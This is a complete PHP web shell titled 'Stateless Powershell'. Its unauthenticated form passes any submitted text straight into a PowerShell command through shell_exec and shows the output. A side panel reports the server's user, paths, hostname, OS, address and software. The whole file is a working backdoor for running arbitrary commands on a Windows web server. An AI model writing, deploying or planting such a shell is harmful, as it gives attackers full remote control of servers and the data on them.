<!-- Please don't roast my CODE!!! -->
<?php
	$locale='de_DE.UTF-8';
	setlocale(LC_ALL,$locale);
	putenv('LC_ALL='.$locale);
?>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	</head>
	<body style="background-color: black; color: lime; display: flex; font-family: consolas;">
		<div>
		<h3>Stateless Powershell</h3>
			<div style="width: 650px; height: 400px; overflow-x: hidden; ">
				<form method="post" style="margin: 0;">
					<input onFocus="this.select()" autofocus value="<?= filter_var($_POST['command'] ?? '', FILTER_SANITIZE_STRING);?>" style="width: 90%; padding: 5px; color: lime; background-color: black; border: 1px solid lime; outline: none !important;" placeholder="command" name="command">
					<button style="margin-left: -9px; cursor: pointer; width: 10%; display: inline-block; padding: 5px; color: lime; background-color: black; border: 1px solid lime;" type="submit">Send</button>
				</form>
				<?php if($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['command'] && !empty($_POST['command'])):?>
					<?php
						$command_output = shell_exec('powershell -command "' . $_POST['command'] . '; if($Error) {echo $Error}"');
					?>
					<pre style="margin: 0; padding: 5px;white-space: pre-wrap;"><b><i>$ <?= filter_var($_POST['command'] ?? '', FILTER_SANITIZE_STRING);?></i></b></pre>
					<pre style="margin: 0; padding: 5px;white-space: pre-wrap;"><?= empty($command_output) ? "No output" : trim($command_output);?></pre>
				<?php endif; ?>
			</div>
		</div>
		<div style="margin-left: 20px;">
			<h3>Data:</h3>

			<table>
				<tr><th style="text-align: left;">Script User:</th><td><?= shell_exec('whoami');?></td></tr>
				<tr><th style="text-align: left;">Doc. ROOT:</th><td><?= $_SERVER['DOCUMENT_ROOT'];?></td></tr>
				<tr><th style="text-align: left;">Script Path:</th><td><?= shell_exec('echo %cd%');?></td></tr>
				<tr><th style="text-align: left;">Server Hostname</th><td><?=gethostname()?></td></tr>
				<tr><th style="text-align: left;">Server OS:</th><td><?= php_uname();?></td></tr>
				<tr><th style="text-align: left;">Server Addr:</th><td><?= $_SERVER['SERVER_ADDR'];?></td></tr>
				<tr><th style="text-align: left;">Server Name:</th><td><?= $_SERVER['SERVER_NAME'];?></td></tr>
				<tr><th style="text-align: left;">Server Software:</th><td><?= $_SERVER['SERVER_SOFTWARE'];?></td></tr>
				<tr><th style="text-align: left;">Server Admin</th><td><?= $_SERVER['SERVER_ADMIN'];?></td></tr>
			</table>
		</div>
	</body>
</html>
